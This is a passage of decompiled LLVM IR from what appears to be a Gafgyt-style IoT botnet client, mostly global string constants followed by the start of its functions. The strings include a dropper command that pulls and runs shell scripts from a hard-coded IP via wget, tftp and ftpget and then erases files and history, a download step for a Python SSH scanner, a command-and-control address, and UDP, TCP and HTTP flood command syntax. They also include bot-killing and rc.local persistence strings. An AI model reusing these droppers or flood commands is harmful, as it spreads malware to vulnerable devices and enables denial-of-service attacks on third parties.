@global_var_1001af20.686, i32 0, i32 0), i8* getelementptr inbounds ([131 x i8], [131 x i8]* @global_var_1001a574.664, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_1001a5f8.665, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @global_var_100192e8.611, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @global_var_10019710.623, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_1001a64c.666, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_1001a6bc.667, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @global_var_10019a78.633, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1001a754.668, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_1001afa8.687, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_1001aff4.688, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1001b00c.689, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1001b080.690, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @global_var_1001b0f4.691, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_1001a7a0.669, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_1001a820.670, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_1001a8a0.671, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_1001a920.672, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_1001a9a0.673, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_1001aa20.674, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @global_var_1001aaa0.675, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @global_var_1001ab18.676, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @global_var_1001ab84.677, i32 0, i32 0), i8* getelementptr inbounds ([127 x i8], [127 x i8]* @global_var_1001abf8.678, i32 0, i32 0), i8* getelementptr inbounds ([59 x i8], [59 x i8]* @global_var_1001ac78.679, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_100147e4.391, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_100193e8.614, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_1001acb4.680, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @global_var_1001acfc.681, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @global_var_100190b4.606, i32 0, i32 0), i8* getelementptr inbounds ([208 x i8], [208 x i8]* @global_var_1001ad40.682, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_1001ae10.683, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @global_var_10018a30.589, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_1001ae6c.684, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @global_var_10018d88.598, i32 0, i32 0)]
@global_var_1001477c.693 = constant [6 x i8] c"close\00"
@global_var_10014784.694 = constant [11 x i8] c"keep-alive\00"
@global_var_10014790.695 = constant [7 x i8] c"accept\00"
@global_var_1001bb88.699 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_10008358.700 = constant i32 939524096
@global_var_100083d0.701 = constant [3 x i8] c"8`\00"
@global_var_100084c4.702 = constant [3 x i8] c"8`\00"
@global_var_100084d4.703 = constant [3 x i8] c"8`\00"
@global_var_1001bbc8.704 = constant [439 x i8] c"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://45.32.213.61/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 45.32.213.61 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 45.32.213.61; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.32.213.61 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c\00"
@global_var_1000853c.705 = constant [3 x i8] c"8`\00"
@global_var_10008544.706 = constant i32 1207959576
@global_var_1001bd80.707 = constant [4 x i8] c"%d\0A\00"
@global_var_1001bd84.708 = constant [7 x i8] c"PYTHON\00"
@global_var_1001bd8c.709 = constant [8 x i8] c"INSTALL\00"
@global_var_1001bd94.710 = constant [130 x i8] c"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 45.32.213.61/good2.py\00"
@global_var_1001be18.711 = constant [26 x i8] c"INSTALLING PYTHON SCANNER\00"
@global_var_1001be34.712 = constant [7 x i8] c"UPDATE\00"
@global_var_1001be3c.713 = constant [47 x i8] c"cd /.tmp;rm -rf *py;wget 45.32.213.61/good2.py\00"
@global_var_1001be6c.714 = constant [24 x i8] c"UPDATING PYTHON SCANNER\00"
@global_var_1001be84.715 = constant [4 x i8] c"OFF\00"
@global_var_1001be88.716 = constant [31 x i8] c"killall -9 python;pkill python\00"
@global_var_1001bea8.717 = constant [24 x i8] c"STOPPING PYTHON SCANNER\00"
@global_var_1001bec0.718 = constant [6 x i8] c"START\00"
@global_var_1001bec8.719 = constant [40 x i8] c"cd /.tmp;python good2.py 1000 LUCKY 1 3\00"
@global_var_1001bef0.720 = constant [28 x i8] c"STARTING VOIDS HACKA SCANNA\00"
@global_var_1001bf0c.721 = constant [6 x i8] c"PONG!\00"
@global_var_10008758.722 = constant i32 1207964068
@global_var_1001bf14.723 = constant [6 x i8] c"TABLE\00"
@global_var_1001bf1c.724 = constant [3 x i8] c"%d\00"
@global_var_100087a8.725 = constant i32 1207963988
@global_var_1001bf20.726 = constant [25 x i8] c"UPDATE TAKEN SUCCESFULLY\00"
@global_var_100087ec.727 = constant [3 x i8] c"8`\00"
@global_var_100087f8.728 = constant i32 1207963908
@global_var_1001bf3c.729 = constant [8 x i8] c"SCANNER\00"
@global_var_1002e618.730 = local_unnamed_addr global i32 0
@global_var_1001bf44.731 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_1001bf58.732 = constant [3 x i8] c"ON\00"
@global_var_1001bf5c.733 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_1000895c.734 = constant [3 x i8] c"8`\00"
@global_var_1001bf78.735 = constant [6 x i8] c"NETIS\00"
@global_var_1001bf80.736 = constant [23 x i8] c"STOPPING NETIS SCANNER\00"
@global_var_1001bf98.737 = constant [23 x i8] c"STARTING NETIS SCANNER\00"
@global_var_10008acc.738 = constant [3 x i8] c"8`\00"
@global_var_1001bfb0.739 = constant [8 x i8] c"REMOVER\00"
@global_var_1001bfb8.740 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_10008b48.741 = constant [3 x i8] c"8`\00"
@global_var_1001bfd8.742 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_1001bfe4.743 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_10008bb0.744 = constant i32 1207962956
@global_var_1001bff8.745 = constant [4 x i8] c"UDP\00"
@global_var_1001bffc.746 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_10008d28.747 = constant i32 1207962580
@global_var_10008ed0.748 = constant [3 x i8] c"8`\00"
@global_var_10008ed8.749 = constant [3 x i8] c"8`\00"
@global_var_10008f34.750 = constant [3 x i8] c"8`\00"
@global_var_1001c070.751 = constant [4 x i8] c"TCP\00"
@global_var_1001c074.752 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_1000906c.753 = constant i32 1207961744
@global_var_100091c0.754 = constant [3 x i8] c"8`\00"
@global_var_100091c8.755 = constant [3 x i8] c"8`\00"
@global_var_10009220.756 = constant [3 x i8] c"8`\00"
@global_var_1001c130.757 = constant [5 x i8] c"HTTP\00"
@global_var_1000934c.758 = constant [3 x i8] c"8`\00"
@global_var_10009354.759 = constant [3 x i8] c"8`\00"
@global_var_10009424.760 = constant [3 x i8] c"8`\00"
@global_var_1001c138.761 = constant [4 x i8] c"CNC\00"
@global_var_1001c13c.762 = constant [27 x i8] c"CNC <target> <port> <time>\00"
@global_var_100094b8.763 = constant i32 1207960644
@global_var_10009570.764 = constant [3 x i8] c"8`\00"
@global_var_10009578.765 = constant [3 x i8] c"8`\00"
@global_var_100095c0.766 = constant [3 x i8] c"8`\00"
@global_var_1001c158.767 = constant [4 x i8] c"STD\00"
@global_var_1001c15c.768 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_10009654.769 = constant i32 1207960232
@global_var_100096fc.770 = constant [3 x i8] c"8`\00"
@global_var_10009704.771 = constant [3 x i8] c"8`\00"
@global_var_1000974c.772 = constant [3 x i8] c"8`\00"
@global_var_1001c178.773 = constant [9 x i8] c"KILLATTK\00"
@global_var_1001c184.774 = constant [11 x i8] c"Killed %d.\00"
@global_var_100098b0.775 = constant i32 1207959584
@global_var_1001c190.776 = constant [13 x i8] c"None Killed.\00"
@global_var_1001c1a0.777 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_1002e5a4.778 = local_unnamed_addr global i32 -1
@global_var_100135a8.779 = constant [18 x i8] c"185.158.113.30:77\00"
@global_var_1002e5a0.780 = global [18 x i8]* @global_var_100135a8.779
@global_var_100099e0.781 = constant i32 939524762
@global_var_1001c1ac.782 = constant [8 x i8] c"8.8.8.8\00"
@global_var_1001c1b4.783 = constant [16 x i8] c"/proc/net/route\00"
@global_var_1001c1c4.784 = constant [11 x i8] c"\0900000000\09\00"
@global_var_10009ce4.785 = constant i32 939524096
@global_var_1002e5f8.786 = global i32 0
@global_var_10009d38.787 = constant i32 1207959564
@global_var_1001c1d0.788 = constant [7 x i8] c"Device\00"
@global_var_1001c1d8.789 = constant i32 0
@global_var_10009e1c.790 = constant [3 x i8] c"8`\00"
@global_var_10009e3c.791 = constant [3 x i8] c"8`\00"
@global_var_10009e5c.792 = constant i32 939524096
@global_var_1001c1dc.793 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 1912602624
@global_var_1001c1f4.795 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1001c204.796 = constant i32 788529152
@global_var_1001c208.797 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_10009f78.798 = constant i32 1207959620
@global_var_1001c210.799 = constant i32 1627389952
@global_var_1000a020.800 = constant i32 1207959576
@global_var_1000a02c.801 = constant i32 1207959564
@global_var_1000a03c.802 = constant i32 1207962721
@global_var_1000a068.803 = constant [3 x i8] c"8`\00"
@global_var_1001c214.804 = constant [13 x i8] c"fork failed\0A\00"
@global_var_1000a0bc.805 = constant i32 1207959576
@global_var_1000a0d4.806 = constant i32 1207963621
@global_var_1000a0e4.807 = constant [3 x i8] c"8`\00"
@global_var_1000a0f0.808 = constant i32 1207959556
@global_var_1001c224.809 = constant [16 x i8] c"Connected %s:%s\00"
@global_var_1000a158.810 = constant i32 939524096
@global_var_1001c234.811 = constant [5 x i8] c"PONG\00"
@global_var_1000a49c.812 = constant i32 1207960788
@global_var_1001c23c.813 = constant [4 x i8] c"DUP\00"
@global_var_1001c240.814 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_1001c254.815 = constant [3 x i8] c"SH\00"
@global_var_1001c258.816 = constant [8 x i8] c"%s 2>&1\00"
@global_var_1001c260.817 = constant [3 x i8] c"%s\00"
@global_var_1000a7b4.818 = constant [3 x i8] c"8`\00"
@global_var_1000a7e4.819 = constant [3 x i8] c"8`\00"
@global_var_1000a7ec.820 = constant i32 939524097
@global_var_1001c264.821 = constant i32 536870912
@global_var_1000aa28.822 = constant i32 1207959564
@global_var_1000adc4.823 = constant i32 1207959560
@global_var_1002e638.824 = local_unnamed_addr global i32 0
@global_var_1000b134.825 = constant i32 939524118
@global_var_1002e5b0 = external local_unnamed_addr global i32
@global_var_1002e648.826 = global i32 0
@global_var_1000f670.827 = constant [3 x i8] c"8`\00"
@global_var_1002e290.828 = global i32 0
@global_var_1002e620.829 = local_unnamed_addr global i32 0
@global_var_1002e624.830 = local_unnamed_addr global i32 0
@global_var_1000b384.831 = constant i32 1207965953
@global_var_1000b600.832 = constant i32 1207960120
@global_var_1002e5d4.833 = local_unnamed_addr global i32 2
@global_var_1002e278.834 = global i32 0
@global_var_1002e5d0.835 = global i32* bitcast (i16* @global_var_1002e2a8.228 to i32*)
@global_var_1000b834.836 = constant i32 1207959560
@global_var_1000b884.837 = constant [3 x i8] c" c\00"
@global_var_1000b8a0.838 = constant [3 x i8] c" c\00"
@global_var_1001c868.839 = constant i32 0
@global_var_1000bbec.840 = constant i32 1207961092
@global_var_1000bd18.841 = constant i32 1207960768
@global_var_1001c89c.842 = constant i32 269488136
@global_var_1001c880.843 = constant [6 x i8] c"(nil)\00"
@global_var_1001c888.844 = constant [7 x i8] c"(null)\00"
@global_var_1001c890.845 = constant i32 721431808
@global_var_1000c174.846 = constant i32 939524096
@global_var_1001c91c.847 = constant i32 65793
@global_var_1001c904.848 = constant i32 524293
@global_var_1001c8fc.849 = constant [8 x i8] c" +0-#'I\00"
@global_var_1001c8a4.850 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1001c8e4.851 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1001c8d8.852 = constant i32 67343
@global_var_1001c8d7.853 = constant i32 50331911
@global_var_1001c8c8.854 = constant i32 268435461
@global_var_1001c8b8.855 = constant i32 520093701
@global_var_1000cb30.856 = constant [3 x i8] c"8a\00"
@global_var_1000ce58.857 = constant i32 1207959708
@global_var_1000cf00.858 = constant i32 1207959612
@global_var_1000d04c.859 = constant i32 939589631
@global_var_1000d100.860 = constant i32 939524118
@global_var_1001c938.861 = constant [8 x i8] c"Success\00"
@global_var_1001c928.862 = constant [15 x i8] c"Unknown error \00"
@global_var_1001d5d6.863 = constant i32 1
@global_var_1002e5e4.864 = local_unnamed_addr global i32* @global_var_1001d5d6.863
@global_var_1002e628.865 = global i32 0
@global_var_10034688.866 = global i32 0
@global_var_10034864.867 = global i32 0
@global_var_10034698.868 = global i32 0
@global_var_1002e570.869 = global i32 0
@global_var_1002e654.870 = local_unnamed_addr global i32 0
@global_var_10034950.871 = global i32 0
@global_var_1000de9c.872 = constant [3 x i8] c"8`\00"
@global_var_1000df80.873 = constant i32 939524098
@global_var_1000dfc0.874 = constant [3 x i8] c"8`\00"
@global_var_1000e1c8.875 = constant i32 939524118
@global_var_1000e250.876 = constant i32 939524118
@global_var_100348a8.877 = global i32 0
@global_var_10034878.878 = global i32 0
@global_var_1002e5d8 = external global i32
@global_var_10034928.881 = global i32 0
@global_var_1000e4ac.882 = constant i32 939524108
@global_var_1000e544.883 = constant [3 x i8] c"8`\00"
@global_var_1000e5f0.884 = constant [3 x i8] c"8`\00"
@global_var_1000e918.885 = constant i32 1207959640
@global_var_1000e954.886 = constant i32 1207959580
@global_var_1002e4a0.887 = global i32 0
@global_var_1002e4b8 = external global i32
@global_var_1002e4d8.889 = global i32 -1726662223
@global_var_1002e4c0.890 = local_unnamed_addr global i32* @global_var_1002e4d8.889
@global_var_1002e4bc.891 = global i32* @global_var_1002e4d8.889
@global_var_1001d494.892 = constant i32 0
@global_var_1000ec6c.893 = constant i32 939524118
@global_var_1001d4bc.894 = constant [8 x i8] c"/bin/sh\00"
@global_var_1001d4c4.895 = constant [3 x i8] c"sh\00"
@global_var_1001d4c8.896 = constant [3 x i8] c"-c\00"
@global_var_1000efc0.897 = constant [3 x i8] c"8`\00"
@global_var_1000f1d4.898 = constant i32 939524130
@global_var_1002e554.899 = global i32 0
@global_var_1002e62c.900 = local_unnamed_addr global i32 0
@global_var_1000f268.901 = constant i32 1207960437
@global_var_1002e634.902 = local_unnamed_addr global i32 0
@global_var_1002e000.903 = global i32 -1
@global_var_1002e63c.904 = local_unnamed_addr global i32 0
@global_var_1002e640.905 = local_unnamed_addr global i32 0
@global_var_1001d4cc.906 = constant [10 x i8] c"/dev/null\00"
@global_var_1002e644.907 = local_unnamed_addr global i32 0
@global_var_1002e630.908 = local_unnamed_addr global i32 0
@global_var_1000f988.909 = constant i32 939524096
@global_var_1000f9a4.910 = constant i32 939524096
@global_var_1002e668.911 = local_unnamed_addr global i32 0
@global_var_1002e64c.912 = global i32 0
@global_var_1000fd60.913 = constant i32 939524180
@global_var_1001007c.914 = constant i32 939524105
@global_var_1001d800.915 = constant [4 x i8] c"inf\00"
@global_var_1001d803.917 = constant i32 4804166
@global_var_1001d810.918 = constant i32 771763200
@global_var_10034890.920 = global i32 0
@global_var_1002e650.921 = local_unnamed_addr global i32 0
@global_var_10011030.923 = constant i32 1207960848
@global_var_1002e658.924 = local_unnamed_addr global i32 0
@global_var_1001d860.925 = constant i32 771751936
@global_var_10034940.926 = global i32 0
@global_var_10011120.927 = constant [3 x i8] c"8a\00"
@global_var_1001112c.928 = constant i32 939524097
@global_var_10011200.929 = constant i32 939524097
@global_var_100112d4.930 = constant i32 939524097
@global_var_10011300.931 = constant i32 939524100
@global_var_100113e0.932 = constant i32 1207959684
@global_var_1001155c.933 = constant i32 939589631
@global_var_1001d87c.934 = constant i32 1912602624
@global_var_1001d868.935 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1001d880.936 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1001d898.937 = constant [11 x i8] c"nameserver\00"
@global_var_1001d8a4.938 = constant [7 x i8] c"domain\00"
@global_var_1001d8ac.939 = constant [7 x i8] c"search\00"
@global_var_10011894.940 = constant i32 1207959568
@global_var_1001189c.941 = constant i32 939524099
@global_var_1002e588.942 = global i32 0
@global_var_100119fc.943 = constant i32 939524129
@global_var_1002e65c.944 = local_unnamed_addr global i32 0
@global_var_10011a70.945 = constant [3 x i8] c"8`\00"
@global_var_10011aa8.946 = constant i32 939524129
@global_var_1002e660.947 = local_unnamed_addr global i32 0
@global_var_1002e664.948 = local_unnamed_addr global i32 0
@global_var_10011e84.949 = constant i32 939524171
@global_var_10011f34.950 = constant i32 939524105
@global_var_100122d0.951 = constant [3 x i8] c"8`\00"
@global_var_1001d8c8.952 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_100124c8.953 = constant [3 x i8] c"9 \00"
@global_var_100124d4.954 = constant i32 939524193
@global_var_1001253c.956 = constant i32 939524101
@global_var_10012628.957 = constant i32 939524124
@global_var_100126a0.958 = constant i32 1207960116
@global_var_100126b8.959 = constant i32 939524105
@global_var_10012830.960 = constant [3 x i8] c"9 \00"
@global_var_1001d8dc.961 = constant [3 x i8] c"%x\00"
@global_var_100128bc.962 = constant i32 939524124
@global_var_100128e0.963 = constant i32 939524193
@global_var_1001d8e0.964 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1001d8ec.965 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_10012fcc.966 = constant i32 1207959560
@global_var_10013064.967 = constant i32 939589631
@global_var_1002e004.968 = global i32 0
@global_var_1002e66c.2 = local_unnamed_addr global i8 0
@global_var_1002e600.53 = external global i8*
@global_var_1002e601.54 = local_unnamed_addr global i8 0
@global_var_1002e602.55 = local_unnamed_addr global i8 0
@global_var_1002e603.56 = local_unnamed_addr global i8 0
@global_var_1002e604.57 = local_unnamed_addr global i8 0
@global_var_1002e2a8.228 = global i16 288
@global_var_1002e2f8.229 = global i16 272
@global_var_1002e56c.922 = local_unnamed_addr global i16 1
@global_var_1001c1f0.794 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 268435620, i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_1002e66c.2, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1002e01c.4 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1002e01c.4 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1002e01c.4 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_1002e66c.2, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_1002e66c.2, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_1002e010.8, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_1002e010.8 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 add (i32 ptrtoint (i32* @global_var_10010000.9 to i32), i32 -25208), i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 add (i32 ptrtoint (i32* @global_var_10010000.9 to i32), i32 13104), i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1002e688.10, align 4
  %v1_10000260 = add i32 %arg1, -1640531527
  store i32 %v1_10000260, i32* @global_var_1002e68c.11, align 4
  %v1_10000278 = add i32 %arg1, 1013904242
  store i32 %v1_10000278, i32* @global_var_1002e690.12, align 4
  br label %dec_label_pc_10000294

dec_label_pc_10000294:                            ; preds = %entry, %dec_label_pc_10000294
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_100002fc, %dec_label_pc_10000294 ]
  %v1_1000029c = mul i32 %storemerge12, 4
  %v2_100002ac = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_1002e688.10 to i32), i32 -12)
  %v1_100002b0 = inttoptr i32 %v2_100002ac to i32*
  %v2_100002b0 = load i32, i32* %v1_100002b0, align 4
  %v2_100002c8 = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_1002e688.10 to i32), i32 -8)
  %v1_100002cc = inttoptr i32 %v2_100002c8 to i32*
  %v2_100002cc = load i32, i32* %v1_100002cc, align 4
  %v2_100002d0 = xor i32 %storemerge12, -1640531527
  %v2_100002d8 = xor i32 %v2_100002d0, %v2_100002b0
  %v1_100002e0 = xor i32 %v2_100002d8, %v2_100002cc
  %v2_100002f0 = add i32 %v1_1000029c, ptrtoint (i32* @global_var_1002e688.10 to i32)
  %v2_100002f4 = inttoptr i32 %v2_100002f0 to i32*
  store i32 %v1_100002e0, i32* %v2_100002f4, align 4
  %v1_100002fc = add nuw nsw i32 %storemerge12, 1
  %tmp7 = icmp slt i32 %v1_100002fc, 4096
  br i1 %tmp7, label %dec_label_pc_10000294, label %dec_label_pc_10000310

dec_label_pc_10000310:                            ; preds = %dec_label_pc_10000294
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000029c, { 2, 1, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10000294, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  store i32 18782, i32* %r10.global-to-local, align 4
  %v3_10000348 = load i32, i32* @global_var_1002e274.13, align 4
  %v1_1000034c = add i32 %v3_10000348, 1
  %v1_10000350 = urem i32 %v1_1000034c, 4096
  store i32 %v1_10000350, i32* @global_var_1002e274.13, align 4
  %v1_1000036c = mul nuw nsw i32 %v1_10000350, 4
  %v2_10000370 = add i32 %v1_1000036c, ptrtoint (i32* @global_var_1002e688.10 to i32)
  %v1_10000374 = inttoptr i32 %v2_10000370 to i32*
  %v2_10000374 = load i32, i32* %v1_10000374, align 4
  %v6_10000398 = udiv i32 %v2_10000374, 228675
  %v2_1000039c = mul i32 %v2_10000374, 18782
  %v3_100003ac = load i32, i32* @global_var_1002e270.14, align 4
  %v2_100003b8 = add i32 %v3_100003ac, %v2_1000039c
  %v3_100003b8 = icmp ult i32 %v2_100003b8, %v3_100003ac
  %v4_100003bc = zext i1 %v3_100003b8 to i32
  %v5_100003bc = add nuw nsw i32 %v4_100003bc, %v6_10000398
  store i32 %v5_100003bc, i32* %r10.global-to-local, align 4
  %v2_100003ec = add i32 %v5_100003bc, %v2_100003b8
  %v2_10000400 = icmp ult i32 %v2_100003ec, %v5_100003bc
  br i1 %v2_10000400, label %dec_label_pc_10000408, label %dec_label_pc_10000428

dec_label_pc_10000408:                            ; preds = %entry
  %v1_1000040c = add i32 %v2_100003ec, 1
  %v1_1000041c = add nuw nsw i32 %v5_100003bc, 1
  br label %dec_label_pc_10000428

dec_label_pc_10000428:                            ; preds = %entry, %dec_label_pc_10000408
  %storemerge = phi i32 [ %v1_1000041c, %dec_label_pc_10000408 ], [ %v5_100003bc, %entry ]
  %stack_var_-36.0 = phi i32 [ %v1_1000040c, %dec_label_pc_10000408 ], [ %v2_100003ec, %entry ]
  store i32 %storemerge, i32* @global_var_1002e270.14, align 4
  store i32 %v1_10000350, i32* %r10.global-to-local, align 4
  %v2_10000438 = sub i32 -2, %stack_var_-36.0
  store i32 %v2_10000438, i32* %v1_10000374, align 4
  %v0_10000458 = load i32, i32* %r10.global-to-local, align 4
  %v1_10000458 = mul i32 %v0_10000458, 4
  %v2_1000045c = add i32 %v1_10000458, ptrtoint (i32* @global_var_1002e688.10 to i32)
  %v1_10000460 = inttoptr i32 %v2_1000045c to i32*
  %v2_10000460 = load i32, i32* %v1_10000460, align 4
  ret i32 %v2_10000460

; uselistorder directives
  uselistorder i32 %v5_100003bc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v3_100003ac, { 1, 0 }
  uselistorder i32 %v2_10000374, { 1, 0 }
  uselistorder i32 %v1_10000350, { 2, 0, 1 }
  uselistorder i32* @global_var_1002e688.10, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002e688.10 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10000428, { 1, 0 }
}

define i32 @trim(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000049c = call i32 @__GI_strlen()
